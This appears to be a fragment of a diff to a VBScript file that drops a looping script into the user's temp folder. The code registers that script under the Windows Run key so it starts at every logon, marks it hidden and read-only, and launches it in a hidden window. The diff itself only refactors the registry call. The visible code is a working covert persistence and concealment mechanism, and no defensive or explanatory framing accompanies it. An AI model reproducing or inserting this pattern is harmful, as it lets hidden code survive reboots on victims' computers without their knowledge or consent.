@@ -29,7 +29,8 @@ objFile.WriteLine "WScript.Sleep 5000"
 objFile.WriteLine "Loop"
 objFile.WriteLine "On Error Goto 0"
 objFile.Close
-CreateObject("WScript.Shell").Run "reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""Start"" /t REG_SZ /d ""%TEMP%\Start.vbs"" /f", 0, True
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""Start"" /t REG_SZ /d ""%TEMP%\Start.vbs"" /f", 0, True
 objFSO.GetFile(tempPath).Attributes = objFSO.GetFile(tempPath).Attributes Or 3
 objShell.Run "%TEMP%\Start.vbs", 0, False
 On Error Goto 0
